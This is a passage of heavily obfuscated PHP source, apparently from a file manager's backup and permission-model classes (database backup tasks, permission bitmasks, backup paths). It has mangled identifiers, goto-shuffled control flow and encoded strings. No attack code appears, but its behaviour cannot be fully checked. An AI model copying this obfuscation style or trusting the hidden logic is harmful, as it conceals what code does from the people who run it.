$AåÂ€ﬁçãÀ[$fè‡‘ÿ¡ùﬁ[743]] == $fè‡‘ÿ¡ùﬁ[191])) { $Cä´‚—à” = self::$io; } $C›±¨–áÂµ += $FßñáËçâç->sqlFromDb($bÇºâ·«•¬, $B‘◊ÇÈ∂ò√, $eõêóÜøê˘, $Cä´‚—à”); } goto D⁄Ñ›ñ™Ô≤; aâÎ∞—»«¯: $fè‡‘ÿ¡ùﬁ =& $_SERVER[’ÿƒ†ïò]; $AåÂ€ﬁçãÀ = Backup::get(); self::$io = $AåÂ€ﬁçãÀ[$fè‡‘ÿ¡ùﬁ[740]]; goto c‹°¶¡˘®›; D⁄Ñ›ñ™Ô≤: if (isset($eõêóÜøê˘->task[$fè‡‘ÿ¡ùﬁ[776]])) { $EŒåÖ‘Ö≈ﬁ = $eõêóÜøê˘->task[$fè‡‘ÿ¡ùﬁ[776]] ? $eõêóÜøê˘->task[$fè‡‘ÿ¡ùﬁ[776]] : timeFloat(); $Fÿé™“ÊÖå = $EŒåÖ‘Ö≈ﬁ - $eõêóÜøê˘->task[$fè‡‘ÿ¡ùﬁ[777]]; if ($Fÿé™“ÊÖå >= 0.2) { $bË›Ö†ﬁ…› += 1; } } $eõêóÜøê˘->end(); $eÙ¡∂ˆôÃ∏ = array($fè‡‘ÿ¡ùﬁ[764] => $bç¥ç’öü√, $fè‡‘ÿ¡ùﬁ[761] => 1, $fè‡‘ÿ¡ùﬁ[778] => $bË›Ö†ﬁ…›, $fè‡‘ÿ¡ùﬁ[779] => $C›±¨–áÂµ, $fè‡‘ÿ¡ùﬁ[780] => time()); goto eŒ≤Æç⁄—è; eŒ≤Æç⁄—è: Backup::set($eÙ¡∂ˆôÃ∏); if ($bË›Ö†ﬁ…› - $C›±¨–áÂµ > 1) { $EŸ¥ØúÆøó = $fè‡‘ÿ¡ùﬁ[781]; if (stristr(I18n::getType(), $fè‡‘ÿ¡ùﬁ[782])) { $EŸ¥ØúÆøó = $fè‡‘ÿ¡ùﬁ[783]; } write_log(array($EŸ¥ØúÆøó, $eÙ¡∂ˆôÃ∏), $fè‡‘ÿ¡ùﬁ[770]); return !1; } return !0; goto d£–©·ºë„; c‰°µÈûÎ⁄: $E’œ‹øüÙå = $this->tmpFilesPath() . $fè‡‘ÿ¡ùﬁ[766] . self::$name . $fè‡‘ÿ¡ùﬁ[8]; del_dir($E’œ‹øüÙå); mk_dir($E’œ‹øüÙå); goto Cøê§Ω⁄⁄é; Cøê§Ω⁄⁄é: $bË›Ö†ﬁ…› = $C›±¨–áÂµ = 0; try { $E⁄ä‹®ìóÖ = $FßñáËçâç->db()->getTables(); } catch (Exception $f⁄¨ÆƒÉÆÎ) { return !1; } $E⁄ä‹®ìóÖ = array_diff($E⁄ä‹®ìóÖ, array($fè‡‘ÿ¡ùﬁ[767], $fè‡‘ÿ¡ùﬁ[768])); goto Aˆ—∑°â™Ñ; c‹°¶¡˘®›: self::$name = $AåÂ€ﬁçãÀ[$fè‡‘ÿ¡ùﬁ[28]]; $FÀ„‘ÑÁÛˆ = $GLOBALS[$fè‡‘ÿ¡ùﬁ[6]][$fè‡‘ÿ¡ùﬁ[17]]; $bç¥ç’öü√ = $this->_dbType($FÀ„‘ÑÁÛˆ); goto B…›Ç‘≈ô•; d£–©·ºë„: } private function _dbType($Aí–ºë≥É) { goto e∫øË÷ÂƒÍ; F¨€®â÷Ö: return $BÎ€Üâ◊¨Ñ; goto E”‡áÙ‰éÂ; fΩú¶Œ£≤Ó: if ($BÎ€Üâ◊¨Ñ == $f∂»ºÀªµ‰[785]) { $b¬äΩ£Ùä∞ = explode($f∂»ºÀªµ‰[4], $Aí–ºë≥É[$f∂»ºÀªµ‰[786]]); $BÎ€Üâ◊¨Ñ = $b¬äΩ£Ùä∞[0]; } $C—§†õ˘˘ﬁ = array($f∂»ºÀªµ‰[787] => $f∂»ºÀªµ‰[9], $f∂»ºÀªµ‰[788] => $f∂»ºÀªµ‰[789]); if (isset($C—§†õ˘˘ﬁ[$BÎ€Üâ◊¨Ñ])) { $BÎ€Üâ◊¨Ñ = $C—§†õ˘˘ﬁ[$BÎ€Üâ◊¨Ñ]; } goto F¨€®â÷Ö; e∫øË÷ÂƒÍ: $f∂»ºÀªµ‰ =& $_SERVER[’ÿƒ†ïò]; $Aí–ºë≥É = array_change_key_case($Aí–ºë≥É); $BÎ€Üâ◊¨Ñ = $Aí–ºë≥É[$f∂»ºÀªµ‰[784]]; goto fΩú¶Œ£≤Ó; E”‡áÙ‰éÂ: } private function tmpFilesPath() { $fâûë…»∆å =& $_SERVER[’ÿƒ†ïò]; $eÓãèÇäüó = TEMP_FILES; if ($GLOBALS[$fâûë…»∆å[6]][$fâûë…»∆å[88]][$fâûë…»∆å[790]]) { $eÓãèÇäüó = $GLOBALS[$fâûë…»∆å[6]][$fâûë…»∆å[88]][$fâûë…»∆å[790]]; if (!mk_dir($eÓãèÇäüó) || !is_writable($eÓãèÇäüó) || !IO::mkfile($eÓãèÇäüó . $fâûë…»∆å[791])) { $eÓãèÇäüó = TEMP_FILES; } } return $eÓãèÇäüó; } } class BackupDbFile { public function __construct() { } public function index() { goto Cúü≤¯´∞±; f‡èùËÃå‹: Backup::set($B≠Ωºöóœπ); return !0; goto b„ÒÏ‰–µô; f˘§∏Ù∂â§: $Bê¥Ô¬éÒ¢ = CONTROLLER_DIR . $DóŒÏÕÉ®à[798]; $EˆÆ¬ÍÕøœ = CONTROLLER_DIR . $DóŒÏÕÉ®à[799]; IO::copy($Bê¥Ô¬éÒ¢, $EÇµ¿êÕ∆—); goto Eä¶ºã€ü∆; FôÊ≠—æı€: $e“ç—Ω∂π≈ = new TaskFileTransfer($DóŒÏÕÉ®à[794], $DóŒÏÕÉ®à[770], count($EÈÇæµ∫≤ô), LNG($DóŒÏÕÉ®à[771]) . $DóŒÏÕÉ®à[454] . LNG($DóŒÏÕÉ®à[773]) . $DóŒÏÕÉ®à[795]); $e“ç—Ω∂π≈->task[$DóŒÏÕÉ®à[751]] = $FãÂÙ˘ﬂ≈ê; foreach ($fúµë€ãË¡[$DóŒÏÕÉ®à[74]] as $bíù˜ÎÉàÌ) { $EéçÑÃ“ã• = IO::move($bíù˜ÎÉàÌ[$DóŒÏÕÉ®à[76]], $EÇµ¿êÕ∆—); if (!$EéçÑÃ“ã•) { $e“ç—Ω∂π≈->end(); $E˘Ççòí“∫ = IO::getLastError($DóŒÏÕÉ®à[796] . $bíù˜ÎÉàÌ[$DóŒÏÕÉ®à[76]] . $DóŒÏÕÉ®à[797] . $EÇµ¿êÕ∆— . $DóŒÏÕÉ®à[530]); write_log($E˘Ççòí“∫, $DóŒÏÕÉ®à[770]); return !1; } } goto f˘§∏Ù∂â§; Cúü≤¯´∞±: $DóŒÏÕÉ®à =& $_SERVER[’ÿƒ†ïò]; $dìçÿ∂üüÜ = Backup::get(); $f¥âÏ¯ÕÓ∞ = $dìçÿ∂üüÜ[$DóŒÏÕÉ®à[28]]; goto aâ¬·—ú≈Œ; aâ¬·—ú≈Œ: $Bî®ù’ä®ì = $this->tmpFilesPath() . "\142\x61\143\x6b\x75\160\137{$f¥âÏ¯ÕÓ∞}\57"; $EÇµ¿êÕ∆— = $this->backupPath($dìçÿ∂üüÜ); if (!($EÇµ¿êÕ∆— = IO::mkdir($EÇµ¿êÕ∆—))) { return !1; } goto bìªöç‰œí; eÈ‹ëÏ–Ù´: if (!$FãÂÙ˘ﬂ≈ê) { return !1; } $B≠Ωºöóœπ = array($DóŒÏÕÉ®à[792] => $FãÂÙ˘ﬂ≈ê, $DóŒÏÕÉ®à[793] => time()); Backup::set($B≠Ωºöóœπ); goto FôÊ≠—æı€; bìªöç‰œí: $fúµë€ãË¡ = IO::listPath($Bî®ù’ä®ì); $EÈÇæµ∫≤ô = isset($fúµë€ãË¡[$DóŒÏÕÉ®à[74]]) ? $fúµë€ãË¡[$DóŒÏÕÉ®à[74]] : array(); $FãÂÙ˘ﬂ≈ê = array_sum(array_column($EÈÇæµ∫≤ô, $DóŒÏÕÉ®à[78])); goto eÈ‹ëÏ–Ù´; Eä¶ºã€ü∆: IO::copy($EˆÆ¬ÍÕøœ, $EÇµ¿êÕ∆—); $e“ç—Ω∂π≈->end(); $B≠Ωºöóœπ = array($DóŒÏÕÉ®à[800] => $FãÂÙ˘ﬂ≈ê, $DóŒÏÕÉ®à[801] => time()); goto f‡èùËÃå‹; b„ÒÏ‰–µô: } private function backupPath($BõÖ≈¨ù·é) { $e¢‰ˆ¥°™ =& $_SERVER[’ÿƒ†ïò]; $dﬂıØê¡Ïâ = $BõÖ≈¨ù·é[$e¢‰ˆ¥°™[28]]; $dë·¢±®ñè = Model($e¢‰ˆ¥°™[758])->get($e¢‰ˆ¥°™[759]); $dØ’‘áÃ™Ö = substr(md5($e¢‰ˆ¥°™[760] . $dë·¢±®ñè . $dﬂıØê¡Ïâ), 0, 8); return "\173\151\x6f\x3a{$BõÖ≈¨ù·é[$e¢‰ˆ¥°™[740]]}\175\57\x64\141\164\x61\142\x61\x73\145\x2f\142\141\143\153\165\160\x2f" . $dﬂıØê¡Ïâ . $e¢‰ˆ¥°™[71] . $dØ’‘áÃ™Ö; } private function tmpFilesPath() { $eÁ¥ûç∏∞  =& $_SERVER[’ÿƒ†ïò]; $Bîï∞â´≤‹ = TEMP_FILES; if ($GLOBALS[$eÁ¥ûç∏∞ [6]][$eÁ¥ûç∏∞ [88]][$eÁ¥ûç∏∞ [790]]) { $Bîï∞â´≤‹ = $GLOBALS[$eÁ¥ûç∏∞ [6]][$eÁ¥ûç∏∞ [88]][$eÁ¥ûç∏∞ [790]]; if (!mk_dir($Bîï∞â´≤‹) || !is_writable($Bîï∞â´≤‹) || !IO::mkfile($Bîï∞â´≤‹ . $eÁ¥ûç∏∞ [791])) { $Bîï∞â´≤‹ = TEMP_FILES; } } return $Bîï∞â´≤‹; } } goto EÖπ∆‹ŸΩ ; b∂∑ﬁ’∂Üª: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $CÖÈ·ü¨åÒ =& $_SERVER[’ÿƒ†ïò]; $d†∫µíã¥∂ = array(array($CÖÈ·ü¨åÒ[415] => LNG($CÖÈ·ü¨åÒ[1727]), $CÖÈ·ü¨åÒ[1728] => $CÖÈ·ü¨åÒ[1729], $CÖÈ·ü¨åÒ[1730] => 1, $CÖÈ·ü¨åÒ[1731] => 1, $CÖÈ·ü¨åÒ[1732] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($CÖÈ·ü¨åÒ[415] => LNG($CÖÈ·ü¨åÒ[1733]), $CÖÈ·ü¨åÒ[1728] => $CÖÈ·ü¨åÒ[1734], $CÖÈ·ü¨åÒ[1730] => 2, $CÖÈ·ü¨åÒ[1731] => 1, $CÖÈ·ü¨åÒ[1732] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($CÖÈ·ü¨åÒ[415] => LNG($CÖÈ·ü¨åÒ[1735]), $CÖÈ·ü¨åÒ[1728] => $CÖÈ·ü¨åÒ[1736], $CÖÈ·ü¨åÒ[1730] => 3, $CÖÈ·ü¨åÒ[1731] => 1, $CÖÈ·ü¨åÒ[1732] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($CÖÈ·ü¨åÒ[415] => LNG($CÖÈ·ü¨åÒ[1737]), $CÖÈ·ü¨åÒ[1728] => $CÖÈ·ü¨åÒ[1738], $CÖÈ·ü¨åÒ[1730] => 4, $CÖÈ·ü¨åÒ[1731] => 1, $CÖÈ·ü¨åÒ[1732] => self::AUTH_SHOW | self::AUTH_VIEW), array($CÖÈ·ü¨åÒ[415] => LNG($CÖÈ·ü¨åÒ[1739]), $CÖÈ·ü¨åÒ[1728] => $CÖÈ·ü¨åÒ[1740], $CÖÈ·ü¨åÒ[1730] => 5, $CÖÈ·ü¨åÒ[1731] => 1, $CÖÈ·ü¨åÒ[1732] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($CÖÈ·ü¨åÒ[415] => LNG($CÖÈ·ü¨åÒ[1741]), $CÖÈ·ü¨åÒ[1728] => $CÖÈ·ü¨åÒ[1742], $CÖÈ·ü¨åÒ[1730] => 6, $CÖÈ·ü¨åÒ[1731] => 1, $CÖÈ·ü¨åÒ[1732] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($CÖÈ·ü¨åÒ[415] => LNG($CÖÈ·ü¨åÒ[1743]), $CÖÈ·ü¨åÒ[1728] => $CÖÈ·ü¨åÒ[1744], $CÖÈ·ü¨åÒ[1730] => 7, $CÖÈ·ü¨åÒ[1731] => 1, $CÖÈ·ü¨åÒ[1732] => 0)); return $d†∫µíã¥∂; } public static function authCheck($aÕÀô·≠•“, $C‚–„«⁄é) { $aÕÀô·≠•“ = intval($aÕÀô·≠•“); if ($GLOBALS[$_SERVER[’ÿƒ†ïò][499]]) { return !0; } if ($aÕÀô·≠•“ <= 0) { return !1; } if (($aÕÀô·≠•“ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($aÕÀô·≠•“ & $C‚–„«⁄é); } public static function authCheckShow($eúÇ∞Î⁄Ã£) { return self::authCheck($eúÇ∞Î⁄Ã£, self::AUTH_SHOW); } public static function authCheckView($fúÚ¡çü∞Ú) { return self::authCheck($fúÚ¡çü∞Ú, self::AUTH_VIEW); } public static function authCheckDownload($BïÚ∏⁄ê≥†) { return self::authCheck($BïÚ∏⁄ê≥†, self::AUTH_DOWNLOAD); } public static function authCheckUpload($E¶Ë¥©£ç≠) { return self::authCheck($E¶Ë¥©£ç≠, self::AUTH_UPLOAD); } public static function authCheckEdit($CÜ–éú»√‘) { return self::authCheck($CÜ–éú»√‘, self::AUTH_EDIT); } public static function authCheckRemove($E‘Éπãî·‡) { return self::authCheck($E‘Éπãî·‡, self::AUTH_REMOVE); } public static function authCheckShare($Aî€ıÉçƒ´) { return self::authCheck($Aî€ıÉçƒ´, self::AUTH_SHARE); } public static function authCheckComment($E¡‰πñ€£É) { return self::authCheck($E¡‰πñ€£É, self::AUTH_COMMENT); } public static function authCheckEvent($cÏ–∫â‚Ωƒ) { return self::authCheck($cÏ–∫â‚Ωƒ, self::AUTH_EVENT); } public static function authCheckRoot($cèàâ⁄ø„â) { return self::authCheck($cèàâ⁄ø„â, self::AUTH_ROOT); } public static function authCheckAction($C±≥ñÂöø¢, $a¨ÿ±ıîÑó) { goto eß’˘Ï ∆û; fÃîíÜ÷›‚: if (($C±≥ñÂöø¢ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($C±≥ñÂöø¢ & $B≠Ú”‘Ç˜ˆ); goto e‰£ú∂åë¯; eß’˘Ï ∆û: $e®¡√Ï‰Ùœ =& $_SERVER[’ÿƒ†ïò]; $Féß®ŒÈœ∏ = array($e®¡√Ï‰Ùœ[1745] => self::AUTH_VIEW, $e®¡√Ï‰Ùœ[1122] => self::AUTH_DOWNLOAD, $e®¡√Ï‰Ùœ[107] => self::AUTH_UPLOAD, $e®¡√Ï‰Ùœ[1693] => self::AUTH_EDIT, $e®¡√Ï‰Ùœ[1692] => self::AUTH_REMOVE, $e®¡√Ï‰Ùœ[1703] => self::AUTH_SHARE, $e®¡√Ï‰Ùœ[352] => self::AUTH_COMMENT, $e®¡√Ï‰Ùœ[1545] => self::AUTH_EVENT, $e®¡√Ï‰Ùœ[1746] => self::AUTH_ROOT); if (!isset($Féß®ŒÈœ∏[$a¨ÿ±ıîÑó])) { return; } goto DñÉŒî áõ; DñÉŒî áõ: $B≠Ú”‘Ç˜ˆ = $Féß®ŒÈœ∏[$a¨ÿ±ıîÑó]; $C±≥ñÂöø¢ = intval($C±≥ñÂöø¢); if ($C±≥ñÂöø¢ <= 0) { return !1; } goto fÃîíÜ÷›‚; e‰£ú∂åë¯: } public static function authDisable($C◊œÆÑí§Ù, $bæ•…í≈√) { if (intval($C◊œÆÑí§Ù) <= 0) { return 0; } return intval($C◊œÆÑí§Ù) & ~$bæ•…í≈√; } public $optionType = "\x53\171\x73\164\x65\x6d\x2e\x73\x6f\165\x72\143\145\101\165\164\150\114\x69\163\164"; public $field = array("\156\x61\x6d\x65", "\141\x75\164\x68", "\x6c\141\142\x65\154", "\144\151\163\160\x6c\x61\171", "\163\171\163\164\x65\155", "\163\157\x72\x74"); public function initData() { $c©ÇèπﬂÇº = $this->authDefault(); foreach ($c©ÇèπﬂÇº as $b–É¿ıØùÃ) { $this->add($b–É¿ıØùÃ); } } public function findAuth($a≠¡ÙÜÀºô, $a‡¿·Ë“ª—) { $dÔôáÎú· =& $_SERVER[’ÿƒ†ïò]; $bÁçà˘çö£ = parent::listData(); foreach ($bÁçà˘çö£ as $E∞ÿ«¥¯Ñâ) { $d ëÛÖ‰è’ = intval($E∞ÿ«¥¯Ñâ[$dÔôáÎú·[408]]); if ($d ëÛÖ‰è’ <= 0 || $E∞ÿ«¥¯Ñâ[$dÔôáÎú·[1747]] == 0) { continue; } if (($d ëÛÖ‰è’ & $a≠¡ÙÜÀºô) != $a≠¡ÙÜÀºô) { continue; } if (($d ëÛÖ‰è’ & $a‡¿·Ë“ª—) != 0) { continue; } return $E∞ÿ«¥¯Ñâ[$dÔôáÎú·[395]]; } return !1; } public function findAuthReadOnly() { $DÃˆÀ√áë≤ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $cÎıëÈ·œù = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($DÃˆÀ√áë≤, $cÎıëÈ·œù); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function listData($D‡® ˜’§å = false, $F±Ÿµä…çÎ = "\x73\157\x72\x74", $AƒÕ⁄˘öÌÛ = false) { return parent::listData($D‡® ˜’§å, $F±Ÿµä…çÎ, $AƒÕ⁄˘öÌÛ); } public function update($càëÖÃü±, $cÔÔ“ç¥èú) { $a¶√¥ñÙû  =& $_SERVER[’ÿƒ†ïò]; $fƒå∫¨¬û÷ = parent::listData($càëÖÃü±); $C’ŸÖÙœ‹â = $this->findByName($cÔÔ“ç¥èú[$a¶√¥ñÙû [28]]); if (!$fƒå∫¨¬û÷ || $C’ŸÖÙœ‹â && $C’ŸÖÙœ‹â[$a¶√¥ñÙû [395]] != $fƒå∫¨¬û÷[$a¶√¥ñÙû [395]]) { return !1; } $this->filterAuth($cÔÔ“ç¥èú[$a¶√¥ñÙû [408]]); return parent::update($càëÖÃü±, $cÔÔ“ç¥èú); } public function remove($f∑˜Êò∆‡Ÿ) { $bÜÓø÷©Øö = parent::listData($f∑˜Êò∆‡Ÿ); if (!$bÜÓø÷©Øö || $bÜÓø÷©Øö[$_SERVER[’ÿƒ†ïò][1199]]) { return !1; } return parent::remove($f∑˜Êò∆‡Ÿ); } public function add($FÇâÜâöå“ = array()) { goto b·‚Ü«—˘ä; DüúíÀÈ§¢: $FÇâÜâöå“ = array_merge($d÷◊ÓÚ∂äƒ, $FÇâÜâöå“); $FÇâÜâöå“[$FæòçÁΩ◊‰[1749]] = $this->getSort(); $this->filterAuth($FÇâÜâöå“[$FæòçÁΩ◊‰[408]]); goto FèË»œµäÀ; FèË»œµäÀ: return parent::insert($FÇâÜâöå“); goto E”üÜá’®π; b·‚Ü«—˘ä: $FæòçÁΩ◊‰ =& $_SERVER[’ÿƒ†ïò]; if ($this->findByName($FÇâÜâöå“[$FæòçÁΩ◊‰[28]])) { return !1; } $d÷◊ÓÚ∂äƒ = array($FæòçÁΩ◊‰[28] => $FæòçÁΩ◊‰[33], $FæòçÁΩ◊‰[408] => 1, $FæòçÁΩ◊‰[1748] => $FæòçÁΩ◊‰[1736], $FæòçÁΩ◊‰[1747] => 1, $FæòçÁΩ◊‰[1199] => 0, $FæòçÁΩ◊‰[1749] => 0); goto DüúíÀÈ§¢; E”üÜá’®π: } private function getSort() { $Bˆèèä€Õ =& $_SERVER[’ÿƒ†ïò]; $A√§¡òøÌ¬ = parent::listData(); $Cç◊ΩÕ–ÉÓ = array_to_keyvalue($A√§¡òøÌ¬, $Bˆèèä€Õ[33], $Bˆèèä€Õ[1749]); return empty($Cç◊ΩÕ–ÉÓ) ? 0 : max($Cç◊ΩÕ–ÉÓ) + 1; } private function filterAuth(&$eÏ·À©Ù™‘) { goto EåâÑÃ∞‚ó; EåâÑÃ∞‚ó: if (!$eÏ·À©Ù™‘) { return; } $a§°¨Ø˜ìÎ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $f—Ë´èº¬¿ = array(); goto c¡Ï¿Ÿ°î¥; DÂÊŸÖôâ∑: foreach ($f—Ë´èº¬¿ as $Fª√€ÏÇ‚≈) { if (isset($föÑú‹ÈÿÆ[$Fª√€ÏÇ‚≈])) { $f—Ë´èº¬¿ = array_merge($f—Ë´èº¬¿, $föÑú‹ÈÿÆ[$Fª√€ÏÇ‚≈]); } } $f—Ë´èº¬¿[] = self::AUTH_SHOW; $eÏ·À©Ù™‘ = array_sum(array_unique($f—Ë´èº¬¿)); goto cì·ﬁƒä…Ù; c¡Ï¿Ÿ°î¥: foreach ($a§°¨Ø˜ìÎ as $Fª√€ÏÇ‚≈) { if ($eÏ·À©Ù™‘ & $Fª√€ÏÇ‚≈) { $f—Ë´èº¬¿[] = $Fª√€ÏÇ‚≈; } } if (in_array(self::AUTH_ROOT, $f—Ë´èº¬¿)) { $eÏ·À©Ù™‘ = array_sum($a§°¨Ø˜ìÎ); return; } $föÑú‹ÈÿÆ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto DÂÊŸÖôâ∑; cì·ﬁƒä…Ù: } public function sort($bÇÖÜ∑¥ÔÌ, $e õ∫¬™•õ) { return parent::update($bÇÖÜ∑¥ÔÌ, $e õ∫¬™•õ); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\x6d\x2e\142\x61\x63\153\165\160\114\x69\163\x74"; public $field = array("\x69\157", "\x6e\x61\x6d\x65", "\163\164\141\x74\x75\x73", "\x63\157\x6e\x74\145\156\x74", "\155\141\156\165\141\154", "\162\145\x73\165\154\164", "\164\x69\155\x65\106\162\157\155", "\x74\x69\155\145\x54\157"); public function config() { goto dÈòÂë§Øπ; b ö¿ë∆¢å: $fÇùˆªƒÊ≤ = is_array($fÇùˆªƒÊ≤) ? $fÇùˆªƒÊ≤ : array(); if (!isset($fÇùˆªƒÊ≤[$fÙæÿñ≈ÙΩ[743]])) { $fÇùˆªƒÊ≤[$fÙæÿñ≈ÙΩ[743]] = $fÙæÿñ≈ÙΩ[87]; } unset($fÇùˆªƒÊ≤[$fÙæÿñ≈ÙΩ[1527]]); goto DäçÍÏµ≤; aÁ¶≠‡ì¥: $e°ÚÎìÙ∆Ö = Model($fÙæÿñ≈ÙΩ[1752])->findByKey($fÙæÿñ≈ÙΩ[1545], $B≥ÿéàú·å); if (!$e°ÚÎìÙ∆Ö) { $e°ÚÎìÙ∆Ö = array(); } if (isset($e°ÚÎìÙ∆Ö[$fÙæÿñ≈ÙΩ[197]])) { $e°ÚÎìÙ∆Ö[$fÙæÿñ≈ÙΩ[197]] = json_decode($e°ÚÎìÙ∆Ö[$fÙæÿñ≈ÙΩ[197]], !0); } goto Eâ∂äéπÛ∞; dÈòÂë§Øπ: $fÙæÿñ≈ÙΩ =& $_SERVER[’ÿƒ†ïò]; $fÇùˆªƒÊ≤ = Model($fÙæÿñ≈ÙΩ[758])->get($fÙæÿñ≈ÙΩ[770]); $fÇùˆªƒÊ≤ = json_decode($fÇùˆªƒÊ≤, !0); goto b ö¿ë∆¢å; Eâ∂äéπÛ∞: if (isset($fÇùˆªƒÊ≤[$fÙæÿñ≈ÙΩ[197]])) { $e°ÚÎìÙ∆Ö[$fÙæÿñ≈ÙΩ[197]][$fÙæÿñ≈ÙΩ[1530]] = $fÇùˆªƒÊ≤[$fÙæÿñ≈ÙΩ[197]]; unset($fÇùˆªƒÊ≤[$fÙæÿñ≈ÙΩ[197]]); } return array_merge($e°ÚÎìÙ∆Ö, $fÇùˆªƒÊ≤); goto e¡ÇãëŸ∆ë; DäçÍÏµ≤: Action($fÙæÿñ≈ÙΩ[1750])->taskInit(); Model($fÙæÿñ≈ÙΩ[1526])->cacheClear(); $B≥ÿéàú·å = $fÙæÿñ≈ÙΩ[1751]; goto aÁ¶≠‡ì¥; e¡ÇãëŸ∆ë: } public function listData($E…‹¡ÚË‹£ = false, $Dœ∫Úƒáêﬂ = "\155\157\x64\151\146\171\x54\151\155\145", $Dè”Àø≠àÚ = false) { return parent::listData($E…‹¡ÚË‹£, $Dœ∫Úƒáêﬂ, !0); } public function lastItem() { $F¨ºé≈é€≥ = $this->listData(); return !empty($F¨ºé≈é€≥[0]) ? $F¨ºé≈é€≥[0] : null; } public function kill($aØÜÇ€˜Êö) { goto AÉ¨∆Èéüç; AÉ¨∆Èéüç: $bäòΩ’∏Ùª =& $_SERVER[’ÿƒ†ïò]; $C÷å„æñÆá = $this->listData($aØÜÇ€˜Êö); if (!$C÷å„æñÆá || empty($C÷å„æñÆá[$bäòΩ’∏Ùª[28]])) { return !0; } goto eàÎ©”‡åŸ; eàÎ©”‡åŸ: Task::kill($bäòΩ’∏Ùª[769]); Task::kill($bäòΩ’∏Ùª[794]); Task::kill($bäòΩ’∏Ùª[804]); goto Cäû√«Ó÷Ü; Cäû√«Ó÷Ü: $a±Â®⁄à‘ÿ = $C÷å„æñÆá[$bäòΩ’∏Ùª[28]]; $aÆâ˘§¡‚ô = TEMP_FILES . $bäòΩ’∏Ùª[766] . $a±Â®⁄à‘ÿ . $bäòΩ’∏Ùª[8]; IO::remove($aÆâ˘§¡‚ô, !1); goto fá´≤≥‚…å; fá´≤≥‚…å: return $this->remove($aØÜÇ€˜Êö); goto bÎÚ–áÜﬂË; bÎÚ–áÜﬂË: } public function remove($Fˆªÿ„™°ˆ) { $dæê´èã•Ô = $this->listData($Fˆªÿ„™°ˆ); if (!$dæê´èã•Ô) { return !0; } return $this->backupRemove($dæê´èã•Ô); } private function backupRemove($CÍ∫£ø¢ÔΩ) { parent::remove($CÍ∫£ø¢ÔΩ[$_SERVER[’ÿƒ†ïò][395]]); $C¿ıç·•ÒŸ = $this->backupPath($CÍ∫£ø¢ÔΩ); IO::remove($C¿ıç·•ÒŸ, !1); return !0; } private function backupPath($E∂æ⁄Œ∑ª¯) { $Féäµ‘ìÜ∞ =& $_SERVER[’ÿƒ†ïò]; $eÜ¥Ì°õŸù = $E∂æ⁄Œ∑ª¯[$Féäµ‘ìÜ∞[28]]; $CÇÃÊñ ıä = Model($Féäµ‘ìÜ∞[758])->get($Féäµ‘ìÜ∞[759]); $Bﬂ»†‘·Çπ = substr(md5($Féäµ‘ìÜ∞[760] . $CÇÃÊñ ıä . $eÜ¥Ì°õŸù), 0, 8); return "\x7b\x69\157\72{$E∂æ⁄Œ∑ª¯[$Féäµ‘ìÜ∞[740]]}\175\57\x64\141\164\x61\x62\x61\x73\x65\x2f\x62\141\143\x6b\165\160\57" . $eÜ¥Ì°õŸù . $Féäµ‘ìÜ∞[71] . $Bﬂ»†‘·Çπ; } public function start() { goto eﬁ›‡¨ô÷¬; B‡àû–‘Öä: Backup::set(array($cØå‡≤ÊÜË[738] => 1, $cØå‡≤ÊÜË[490] => time())); return !0; goto AØ∂è´ÔÛé; a£ê¡©ÓÖè: if (!$fËøÙ◊ù—ó || $fËøÙ◊ù—ó[$cØå‡≤ÊÜË[1527]] != $cØå‡≤ÊÜË[87]) { return !1; } $cŸ°Á˜Ó◊¢ = $this->process(); foreach ($cŸ°Á˜Ó◊¢ as $b ıΩ≥À¶Á) { if ($b ıΩ≥À¶Á) { return Task::restart($b ıΩ≥À¶Á[$cØå‡≤ÊÜË[395]]); } } goto Cáé¬∑î≠á; Cáé¬∑î≠á: $F∂Ωã÷®¥î = new Backup(); $c≤‡¶ú§∑ÿ = $F∂Ωã÷®¥î->db(); if ($c≤‡¶ú§∑ÿ) { $c≤‡¶ú§∑ÿ = $F∂Ωã÷®¥î->dbFile(); if ($c≤‡¶ú§∑ÿ && $fËøÙ◊ù—ó[$cØå‡≤ÊÜË[743]] == $cØå‡≤ÊÜË[191]) { $c≤‡¶ú§∑ÿ = 